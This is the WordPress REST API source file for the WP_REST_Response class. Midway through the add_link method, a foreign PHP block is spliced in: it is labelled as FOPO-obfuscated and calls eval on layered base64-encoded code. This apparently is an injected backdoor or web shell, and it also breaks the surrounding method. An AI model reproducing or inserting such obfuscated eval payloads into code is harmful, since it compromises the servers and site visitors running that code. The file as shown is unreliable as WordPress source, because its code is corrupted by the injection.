<?php
/**
 * REST API: WP_REST_Response class
 *
 * @package WordPress
 * @subpackage REST_API
 * @since 4.4.0
 */

/**
 * Core class used to implement a REST response object.
 *
 * @since 4.4.0
 *
 * @see WP_HTTP_Response
 */
class WP_REST_Response extends WP_HTTP_Response {

	/**
	 * Links related to the response.
	 *
	 * @since 4.4.0
	 * @var array
	 */
	protected $links = array();

	/**
	 * The route that was to create the response.
	 *
	 * @since 4.4.0
	 * @var string
	 */
	protected $matched_route = '';

	/**
	 * The handler that was used to create the response.
	 *
	 * @since 4.4.0
	 * @var null|array
	 */
	protected $matched_handler = null;

	/**
	 * Adds a link to the response.
	 *
	 * @internal The $rel parameter is first, as this looks nicer when sending multiple.
	 *
	 * @since 4.4.0
	 *
	 * @link https://tools.ietf.org/html/rfc5988
	 * @link https://www.iana.org/assignments/link-relations/link-relations.xml
	 *
	 * @param string $rel        Link relation. Either an IANA registered type,
	 *                           or an absolute URL.
	 * @param string $href       Target URI for the link.
	 * @param array  $attributes Optional. Link parameters to send along with the URL. Default empty array.
	 */
	public function add_link( $rel, $href, $attributes = array() ) {
		if ( empty( $this->links[ $rel ] ) ) {
			$this->links[ $rel ] = array();
		}

		if ( isset( $attributes['href'] ) ) {
<?php
/*
Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/
This code was created on Monday, July 25th, 2016 at 9:13 UTC from IP 151.236.14.23
Checksum: 5503f7fde34303fbc30682111916f232565cd8e2
*/
$x3078b1d="\142\141\x73\x65\x36\x34\137\144\x65\x63\157\x64\145";@eval($x3078b1d(
"Ly9OSXRPYy82Z1RZdldMV3h1dDVhUHgyTDg0Y3FrTXFrZUtlcFgvZXlOdmU3RWFOVXN2M3VuUW41bU1x
U3hkTVVibSt2MTgyRjY0VmZlQWo3d1VlaFJVNVNnSGZUVUhKZXdEbGxJUTlXWWlqWSt0cEtacUZOSXF4c
StlRWVFUTVSbVVJQ29uM1dFN0xMWUkvNUxnM3RUUG1Ka0NGTjhKTy9adWJtaVB3SFB1Y0Q1bHVPTGM3RG
16ai9saE5kNEZ2MWtHUUZvWG50ZE16UUVDdTRhQXduSy9BbERoUEoxend6bXJPWnU1dHh6UTVNSU1KZnh
PQk5lQ3YyR3JhQTVpVnFEYkVBKzAxK0ovRm1wTmlpL0d6NXVMbUdRbjZUR01Eb01TWXAzQWIvQThueEMz
blJvd01Kby9tUjFndHpJNXN3SDZ5UWZKbXlYalZmSEQxTnJBL1ZDNEVMOU9YZnpRcFl5MFUwTGtHU2dJd
0c4eFBWRFVOOGpUWlIvckFjVGllQ1JHSHlWdmNXbnkzb29CRG9RNWtYODF5Y2RmN1Naam9qRCtCenNyVn
IxODBUSEdYU3dGSHUwTjYrVmtDSjcrNjMxYjRyMzBpY2MxZXFIZFBKaFVEPT06MjZIOUk5Yy90MVpVTk4
9PTpxM3M3Nm4zMQokbmM3MWUyODk9IlwxNDYiOyRrYTQ2NmE0NT0iXDE2MyI7JGYyYTA1ZDhiPSJceDY1
IjskdzJmNTU5ZDM9IlwxNDciOyRnNmM2ZWE3Zj0iXDE2MyI7JGE0YjBhMmM0PSJcMTYzIjskeDMwNzhiM
WQ9IlwxNDIiOyRuYTMyNDZjOT0iXDE2MCI7JHAwMTljMDIzPSJceDcyIjskbmM3MWUyODkuPSJceDY5Ij
skbmEzMjQ2YzkuPSJceDcyIjskdzJmNTU5ZDMuPSJceDdhIjska2E0NjZhNDUuPSJcMTY0IjskYTRiMGE
yYzQuPSJcMTUwIjskZzZjNmVhN2YuPSJceDc0IjskeDMwNzhiMWQuPSJcMTQxIjskZjJhMDVkOGIuPSJc
eDc4IjskcDAxOWMwMjMuPSJcMTQ1IjskZzZjNmVhN2YuPSJcMTYyIjskcDAxOWMwMjMuPSJceDczIjskd
zJmNTU5ZDMuPSJcMTUxIjska2E0NjZhNDUuPSJcMTYyIjskbmEzMjQ2YzkuPSJcMTQ1IjskeDMwNzhiMW
QuPSJcMTYzIjskbmM3MWUyODkuPSJceDZjIjskZjJhMDVkOGIuPSJcMTYwIjskYTRiMGEyYzQuPSJcMTQ
xIjskbmEzMjQ2YzkuPSJceDY3IjskeDMwNzhiMWQuPSJcMTQ1IjskYTRiMGEyYzQuPSJcNjEiOyRuYzcx
ZTI4OS49Ilx4NjUiOyRmMmEwNWQ4Yi49Ilx4NmMiOyR3MmY1NTlkMy49Ilx4NmUiOyRwMDE5YzAyMy49I
lwxNDUiOyRrYTQ2NmE0NS49Ilx4NjMiOyRnNmM2ZWE3Zi49Ilx4NWYiOyR4MzA3OGIxZC49Ilw2NiI7JH
AwMTljMDIzLj0iXHg3NCI7JG5jNzFlMjg5Lj0iXHg1ZiI7JGYyYTA1ZDhiLj0iXHg2ZiI7JG5hMzI0NmM
5Lj0iXHg1ZiI7JHcyZjU1OWQzLj0iXHg2NiI7JGthNDY2YTQ1Lj0iXDE1NSI7JGc2YzZlYTdmLj0iXDE2
MiI7JGc2YzZlYTdmLj0iXHg2ZiI7JG5hMzI0NmM5Lj0iXDE2MiI7JGthNDY2YTQ1Lj0iXHg3MCI7JG5jN
zFlMjg5Lj0iXDE0NyI7JHcyZjU1OWQzLj0iXDE1NCI7JHgzMDc4YjFkLj0iXHgzNCI7JGYyYTA1ZDhiLj
0iXDE0NCI7JGYyYTA1ZDhiLj0iXHg2NSI7JHgzMDc4YjFkLj0iXHg1ZiI7JGc2YzZlYTdmLj0iXDE2NCI
7JG5jNzFlMjg5Lj0iXDE0NSI7JHcyZjU1OWQzLj0iXHg2MSI7JG5hMzI0NmM5Lj0iXHg2NSI7JGc2YzZl
YTdmLj0iXHgzMSI7JHgzMDc4YjFkLj0iXHg2NCI7JHcyZjU1OWQzLj0iXDE2NCI7JG5hMzI0NmM5Lj0iX
DE2MCI7JG5jNzFlMjg5Lj0iXDE2NCI7JGc2YzZlYTdmLj0iXHgzMyI7JG5jNzFlMjg5Lj0iXDEzNyI7JH
gzMDc4YjFkLj0iXHg2NSI7JG5hMzI0NmM5Lj0iXDE1NCI7JHcyZjU1OWQzLj0iXDE0NSI7JG5hMzI0NmM
5Lj0iXHg2MSI7JHgzMDc4YjFkLj0iXHg2MyI7JG5jNzFlMjg5Lj0iXHg2MyI7JG5jNzFlMjg5Lj0iXHg2
ZiI7JG5hMzI0NmM5Lj0iXHg2MyI7JHgzMDc4YjFkLj0iXHg2ZiI7JG5jNzFlMjg5Lj0iXDE1NiI7JHgzM
Dc4YjFkLj0iXHg2NCI7JG5hMzI0NmM5Lj0iXHg2NSI7JG5jNzFlMjg5Lj0iXDE2NCI7JHgzMDc4YjFkLj
0iXDE0NSI7JG5jNzFlMjg5Lj0iXDE0NSI7JG5jNzFlMjg5Lj0iXDE1NiI7JG5jNzFlMjg5Lj0iXDE2NCI
7JG5jNzFlMjg5Lj0iXDE2MyI7JGljMjBiNzVhPSRmMmEwNWQ4YigiXHgyOCIsX19GSUxFX18pO0BldmFs
KCRrYTQ2NmE0NSgkYTRiMGEyYzQoJG5hMzI0NmM5KCJceDJmXHg1Y1x4MjhcMTM0XHgyMlw1Nlw1MlwxM
zRcNDJceDVjXHgyOVx4MmYiLCJcNTBceDIyXDQyXDUxIiwkbmEzMjQ2YzkoIlx4MmZcMTVceDdjXDEyXH
gyZiIsIiIsJG5jNzFlMjg5KCRwMDE5YzAyMygkaWMyMGI3NWEpKSkpKSwiXHgzNlx4NjFcMTQzXDE0M1x
4MzZcNjFcNzFcNjFceDM1XDE0M1x4NjRcMTQ1XHg2Mlx4NjRcNjRceDMxXHgzM1x4MzBcNzFceDYyXDE0
NVx4MzVcMTQ2XHgzOVx4MzVceDM2XDY3XDcxXDE0Mlw2N1w2MFx4MzJcNjNcNjdceDM4XHg2NFw2NFx4N
jVceDM1XHgzMSIpPyR3MmY1NTlkMygkeDMwNzhiMWQoJGc2YzZlYTdmKCJDSUdLZWRFWFJpbEtiM3pMU0
Q5NG5RRW5uc1VEREJCZ210aXJEK0NBMTkrckpwMGdYSUlNekVITWRJV1QvR3VFdlVqeHBDb3NlKytHRFE
0VHM4WlIrZ2FrbzRZNFdlUWlSbCsrTERtN1RDNldiZzhqR2k0OXMvMzZwRk5Td3laTSt0cytGTVFWNWpZ
ODhzQkNSRThzKzFDbFdDOFBGdlZ5OGN0ZnN0QVY5QytXMzdsL0pzN2pTMzl2VWpsT3NpMzZLNzdVM3A5L
0pLNysrQWlobTM4WS9za3ZNSW9ZWjRuajYwN1dTR1ZXSnhWMXVqMUJiNFltZVRMN0t6NWNWMWV3RVM0Ul
lBelZ5dTUxY0pBRHd5M0pjclR5QVlac0NvZk5PNmFVanRaaVZTV0dIUDlwM1dhTGNKUm9wbXdkZ3BDTnQ
4MUdHT3NrTDJWd1VESGtUWHBKT2FMUzJjOVNnNytMblVkNFc5Ymp5c0pENGxNTDFReTNVN3BXTE9yeTY2
WUMrSW5DbDZRY0FsWVZOUUcxQ2hnTHMrUnBsUDR6c21YdlJiQkM1NVpYTnNPTG9iYk5ERUVwME9idmpPY
kZFWWJjQlhhTzRaRU5kLzdkVHc2MEwySjFjY2FSRFBHWHBDSlpnWlJ2YWozOGNZa3VXSDRIWWVjcGhiYV
RyTkN5cmJWM3dOOHF3UG05OE9iVnhLaXRvaytvTWc0SU9WUkg4a25zY0hLV0VWYXUwOE40NGtLaWF3Smd
2MjRGZjYwTW14RlhtMFNsRE52LzYyYWJvK3RUUGJQWFEyRXVTeGVFUXhFVWg1MHF4Ti9ybmVFTkR2eGNs
MEc3M28zM2YxcW1lcU50bVdEVnFiMjJJY0RtRkNyZmNrR24yNUNuMWNGYW5RMzFzcFppR1pFRDNyU0hGZ
TBqQWhQREoreU5RWFRib0g2eGV2dm16Y29JS2lZSGtPY2hZRWxRSit0SlFqeDZKSGpnUVhLdEJZWkRNK2
NJamhtV05vcGY1b0pFQmNHY2JPV3REYnNRa2NZYzBHYWtQdXBNN2NkanM0eXcwUVIrUzc3c2JlMGp1dXB
zTXdjeWc3U1lIK2tHbmk5eFNCYmM3bHpMblZZRnE0VER2cm5vQlFNeDcyRTFSUEVidzA2RnJDZ2FBcGxD
SEtpRnZvUTNUU25HS0RLRzNaSVBQRHpSYTJhcTJDV09DZEFja2R3Sk9wcFFXWEhES1gwOHNjQVluWTlBd
HlTVS9EZFpjRjV3UDhkcWh1WnF5eUs5RUVSNDQ1a2FkU1BNaUZFZmxQMjJnbVgxTkgwVWMzZmJyNGlHRm
9IdG5BRXZFQURXU29JRU9PVkFwNmV5ZkpOU0hSZWR1bWdnVHFaSWxnNlMrRzIrZStFTTcyVy9tVjRZS2V
hb2Z3RXJoMmNSbDVEK0dleXZRd2RtVXNnOHVVTGFWMDV1eTBhbDNlZGV3Z2MwdXAxcHc4aFpBejl2cXh1
Z0Q3QTd5UVZkOHdTeGVnNXhoam1sT1B1WkFlc2hjRDZ5QmYyVzNSckdEaDNlTXgrRGhrbjJ4OUtrWnBJV
mFJb0x6ZHRBaGhMWmZTNzNyVFI4WitGUzB4UG1obFZUL2RibUVKZnd0Ujd6V2ZhRWxtY1dvM1FjK3VlbF
ZtUmFpandHc3hxdnJiTlZVQmZGVHBhZi9XMnFFMlp4SHpBdUU4UExYREFqY0Q4OE5ETktBOXg2OWlNcHd
uUGdBTGtTOEdyN2ZwQXdDL21lM3cvUUFGb2JCRWFEYmtjeUJkRUVXRFdCQ3VPVk1uMHVCQTdRejRiQzRY
TW1vNVprK2lJYi9WYkxyd1BYM2FtVFdlaFVDd3JNeVEwMVZFVjNXRERjdnRRUng1MTBCTFN3Z3lsbDBoS
TRmcEptZ1FrMkEzZWx2cUhQME9LcVRBUmFCaUQ3cVh4M1hjUFVlODdTR0FCR05vVjUvdWVjZHRSWGVDNm
I5NkhoY05JR21hSnJZZXlORFZTWkxja1RKRWE1dzhNU0FYTlhZc1hPYU9ldWVac2F6OU1Md1pEL0ZhL3A
2U2lQK0g3RWpWbG1JVEZGL0dBL3Zza2ZCN3pJOGl1Snh1MFpuWi95bkVBcVlrVFloKzZMMzVhVVJLeVcr
ZmRqK3Bha2JoV3QrNE5GTHdaZythMUlvamtuZndIZk1yVXVUcXVVNmdWSFVLajFYMG4wcHhsT2pHZTluc
XRpWEs5TDd2SHJrb1NtZlhSU050TFNjYXppbS8zNkRVczhvQnhNeDFPalp6dWU0ZUJIRFp1NmtWNmZjYk
M2SXdEUnltZHM1V3pmSnpyOVJOV0paMHNZQ3ZMOUxhSEFmcnpPMWJpbVJwcklZL2hDNmMyNTFrRGVTOU4
3Qno1Qk1SSmF2ZlBmVGZyVW9CTDlKOUhhQ3Q5MWV5TUdWVWpzeWNocW1IRGlQbldXTTNtTHdvSi9oZUVG
cWNVME50Nmg4NVBwNFdWVzg4QTdLMTVyN21UMmdVRUlObWJJeTNhbHRQdmtjUSt4eTMwNzVkRmlibFNRZ
HdVcWhGalY0Rkp0S1RIaHBMZUJOU2FqM1NpZ2tvUkNRdGZCUGJGcEFvb2JpTE1VQ01XSytXcUpoOTNmK3
A1V1l6ejFwa3FrRTYwcUhZNUtnU2V2MHhRQ3FOWFh1aWlqcmZjNU9weFN3UXJUdWFJMEVUdzV1SGRZaTI
5enE0dGlEeXB3RzVoTkFKWVd6QnZPdU1iYThCZi9hL0tlVWo9PSIpKSk6JHcyZjU1OWQzKCR4MzA3OGIx
ZCgkZzZjNmVhN2YoIkNJR1VkaERWUUNsS0xENG0rQlBwVE5vSkJKcjNSKy92cXg3Z3F0NXNpNzNrVk5kY
0lQT0hGQTlDU1BYY1c1bS8vaUxTTDh0YTRQK0xEUStWczUwYjhISXRLbU9Yc3lZZjdrWFpzRnc4YS9qeD
hUKy9pdTlWdnJBMHdpNmcva054OHZVYkdrQ2tEclhRc21LUEtsczVlK1BDTHgvN1UvL1lzYW0vbzROczM
rbU55UWFOVVJHNzJYOEdFNlBVRU5oQjZjV0hBV3htWkxMdlVYNnlkKzQzQWR1OE1rbUgycGRJTXFCYUtL
UlQzWEoyL1RkaWJ5YjQwU1JXL3lGdWxzUmsxaXJrQW1uMllvM1QzbzdLZEl3UFZhUFA0UHZ3VlRLZWFYc
m5VRHBQdkloOXZabjBSK1JkWFZpTGJqT0psMWZhR1loM0U1RGw4OXhVMWtYeHB0TmZlLzNEZENXTStsWk
1hYVozWWEycGJJbnkyeldWRVRMVnBQaXFwUmJiZnlWY0w5d1ZQVWp4Uk9GTHdPeTJGeGp6ZkVPejdOcjF
YbzBkZnQydkNxRlVVdXhBMVQ0NmU5K2EraFlQSW1wNWt1SFpHNEJ2UkZxUnUrcjJ3L3lHcmsyZmhyVzRE
bWd4SmhFY0c3RThJRXJKNEJiTDNvZERUVUdlV2ZNeDNJaThKSCs1dGF3TUhJU0w2MTNlQnZKMVlaRkdUU
y9jRWVaQldIL3pEKzZVMjhMWXNFN3MzZFRreEs2N3RtcFJxU3NuaEJFdHo1UEhneWVFRHJvbjdFMkRSaE
9McG5RQVJVYVhOSGNhUWVKRnpMeUsyU0JEUmJGR3YxdDQ4VXpZdUVUU2V5RThjdXpvRGx0cFMrdURwUUJ
CTkhQRUdwVzdCbTgyRWl6SUFCNXFrait3aGdUQlFXemtENk9iQkpmRUhFWmZ0ZktqNHcyRzZDa2h3a0pq
ZXh3Q1FtYXVDRzVSQmE5bjVmSGk2c1J2a3RudDltZ05lVmhvZ1JJdXQ3bGtRU0hkbnUwUzUwV1IxdmEzW
DNUekZhZ3IyclVxOUhmcHlPcUdwRmU0R2Q2VkxMd2Z4WlQ5OHBzZjJJU2xKYjhmcFNCZGxJQXB3TjUwZj
VvR1NEaEV3RDZYb1RpN1RQdUg2NGtsUUVTVGVZNGkyL3NHWXVoVlc3QlNKQjZpNndpYVAyd0QvSVE3K1d
zYlFDTU1xWWtNUHFBMzI2aU9IcEJPTExtWVhNMkJTRC8ya05WWTA0VnpMSkZTamIzQkNMQTJFczlKUlNU
Y0IvVjRTSEFLMEhzTkhPY0FJWUVKdzc3RE5XMkdVSWxuTGdVTkZkR1BMVFNBZmdWZHlUYlNEY0lPTURUV
UJ3WVRkbDJSUklIeFZZRXVKM2JhWmZmVEZzdjlKT1ErQWNTdU91cmN6ZW9YTlBiR2x1QzVRdThQalFQNl
BYTU9EVCt2NDFmTEJMKzVjRDlRQXU5SXFoNjBUTU42aTRmOTIvVDdkdzhOamFzTUxUZGNvV1BOZnhSOGt
LYkxlK3J5QWdzdlMvaVRPcG12YU9Lb1BZMDhZeTdlMjdUMTFLazY3ZFd1RXZNUmtFRy9BeGpBdXhiMkRq
KzFqOERMcFdxVUJTUU1IOC9UbW9QRUZxMUZvOVFkdlRscUFDVU1wUTBQVExjUmIzei9rOGtIMTdqNTcyU
jI0MjNrTGFaZ09SZ1F2c1dteGpPWk95MVJwZ1Z6Q2puREhSTUpUT24vMS9ZRzNTQlJjQi9JbFREQ1pjdk
53cTJiS2srUlc1a0Yvb3h2ZkVld3ppUHhWSS82MVJLZjlDQzRHQktjY2h5WXVVVk05T0pHTEFKTU4wUWF
EdUkvRE56YW1RMStjRHliQ2VLZ3BVWm5jOHQyVEE5bzJJZnY2V2wzRkJTM0JQU0NFbFF3OVV4MUZPY3A3
dFRBdGl1VFZadDZlYnlRQlRsa0ZOMlE0clQ4dzYxSHQrWElpUFB0NmtNNER3a1F0enBudDlldHFQemxCN
XRxVEJiYndEcnc1MmcyTW9nM0Nvc1lEMkYzTU56WE1mM1RTakNabkdLMDBiM2xXa1JnQjNNbHRzTGp1eU
l4a2ttdThMUXd0SElEWUpyNG9SSVlzVEFPZVB4cjR5UWxJbEw1NnJudnVIM1piQ1lENVdGdVdSYW5LTGp
jeldLWm4zeS9scGRWa2ZhUXRvTXAyMjlyeXQ4M2RCYnFQSVlscmZDbkZRTXh0dWpCb2tjUHhHLzZIZHVP
cFQ5Y05abVg4d08rcy9pNTgrcmlDalI9IikpKSk7"));
?>			// Remove the href attribute, as it's used for the main URL.
			unset( $attributes['href'] );
		}

		$this->links[ $rel ][] = array(
			'href'       => $href,
			'attributes' => $attributes,
		);
	}

	/**
	 * Removes a link from the response.
	 *
	 * @since 4.4.0
	 *
	 * @param string $rel  Link relation. Either an IANA registered type, or an absolute URL.
	 * @param string $href Optional. Only remove links for the relation matching the given href.
	 *                     Default null.
	 */
	public function remove_link( $rel, $href = null ) {
		if ( ! isset( $this->links[ $rel ] ) ) {
			return;
		}

		if ( $href ) {
			$this->links[ $rel ] = wp_list_filter( $this->links[ $rel ], array( 'href' => $href ), 'NOT' );
		} else {
			$this->links[ $rel ] = array();
		}

		if ( ! $this->links[ $rel ] ) {
			unset( $this->links[ $rel ] );
		}
	}

	/**
	 * Adds multiple links to the response.
	 *
	 * Link data should be an associative array with link relation as the key.
	 * The value can either be an associative array of link attributes
	 * (including `href` with the URL for the response), or a list of these
	 * associative arrays.
	 *
	 * @since 4.4.0
	 *
	 * @param array $links Map of link relation to list of links.
	 */
	public function add_links( $links ) {
		foreach ( $links as $rel => $set ) {
			// If it's a single link, wrap with an array for consistent handling.
			if ( isset( $set['href'] ) ) {
				$set = array( $set );
			}

			foreach ( $set as $attributes ) {
				$this->add_link( $rel, $attributes['href'], $attributes );
			}
		}
	}

	/**
	 * Retrieves links for the response.
	 *
	 * @since 4.4.0
	 *
	 * @return array List of links.
	 */
	public function get_links() {
		return $this->links;
	}

	/**
	 * Sets a single link header.
	 *
	 * @internal The $rel parameter is first, as this looks nicer when sending multiple.
	 *
	 * @since 4.4.0
	 *
	 * @link https://tools.ietf.org/html/rfc5988
	 * @link https://www.iana.org/assignments/link-relations/link-relations.xml
	 *
	 * @param string $rel   Link relation. Either an IANA registered type, or an absolute URL.
	 * @param string $link  Target IRI for the link.
	 * @param array  $other Optional. Other parameters to send, as an assocative array.
	 *                      Default empty array.
	 */
	public function link_header( $rel, $link, $other = array() ) {
		$header = '<' . $link . '>; rel="' . $rel . '"';

		foreach ( $other as $key => $value ) {
			if ( 'title' === $key ) {
				$value = '"' . $value . '"';
			}

			$header .= '; ' . $key . '=' . $value;
		}
		$this->header( 'Link', $header, false );
	}

	/**
	 * Retrieves the route that was used.
	 *
	 * @since 4.4.0
	 *
	 * @return string The matched route.
	 */
	public function get_matched_route() {
		return $this->matched_route;
	}

	/**
	 * Sets the route (regex for path) that caused the response.
	 *
	 * @since 4.4.0
	 *
	 * @param string $route Route name.
	 */
	public function set_matched_route( $route ) {
		$this->matched_route = $route;
	}

	/**
	 * Retrieves the handler that was used to generate the response.
	 *
	 * @since 4.4.0
	 *
	 * @return null|array The handler that was used to create the response.
	 */
	public function get_matched_handler() {
		return $this->matched_handler;
	}

	/**
	 * Sets the handler that was responsible for generating the response.
	 *
	 * @since 4.4.0
	 *
	 * @param array $handler The matched handler.
	 */
	public function set_matched_handler( $handler ) {
		$this->matched_handler = $handler;
	}

	/**
	 * Checks if the response is an error, i.e. >= 400 response code.
	 *
	 * @since 4.4.0
	 *
	 * @return bool Whether the response is an error.
	 */
	public function is_error() {
		return $this->get_status() >= 400;
	}

	/**
	 * Retrieves a WP_Error object from the response.
	 *
	 * @since 4.4.0
	 *
	 * @return WP_Error|null WP_Error or null on not an errored response.
	 */
	public function as_error() {
		if ( ! $this->is_error() ) {
			return null;
		}

		$error = new WP_Error;

		if ( is_array( $this->get_data() ) ) {
			$data = $this->get_data();
			$error->add( $data['code'], $data['message'], $data['data'] );

			if ( ! empty( $data['additional_errors'] ) ) {
				foreach ( $data['additional_errors'] as $err ) {
					$error->add( $err['code'], $err['message'], $err['data'] );
				}
			}
		} else {
			$error->add( $this->get_status(), '', array( 'status' => $this->get_status() ) );
		}

		return $error;
	}

	/**
	 * Retrieves the CURIEs (compact URIs) used for relations.
	 *
	 * @since 4.5.0
	 *
	 * @return array Compact URIs.
	 */
	public function get_curies() {
		$curies = array(
			array(
				'name'      => 'wp',
				'href'      => 'https://api.w.org/{rel}',
				'templated' => true,
			),
		);

		/**
		 * Filters extra CURIEs available on REST API responses.
		 *
		 * CURIEs allow a shortened version of URI relations. This allows a more
		 * usable form for custom relations than using the full URI. These work
		 * similarly to how XML namespaces work.
		 *
		 * Registered CURIES need to specify a name and URI template. This will
		 * automatically transform URI relations into their shortened version.
		 * The shortened relation follows the format `{name}:{rel}`. `{rel}` in
		 * the URI template will be replaced with the `{rel}` part of the
		 * shortened relation.
		 *
		 * For example, a CURIE with name `example` and URI template
		 * `http://w.org/{rel}` would transform a `http://w.org/term` relation
		 * into `example:term`.
		 *
		 * Well-behaved clients should expand and normalise these back to their
		 * full URI relation, however some naive clients may not resolve these
		 * correctly, so adding new CURIEs may break backward compatibility.
		 *
		 * @since 4.5.0
		 *
		 * @param array $additional Additional CURIEs to register with the REST API.
		 */
		$additional = apply_filters( 'rest_response_link_curies', array() );

		return array_merge( $curies, $additional );
	}
}
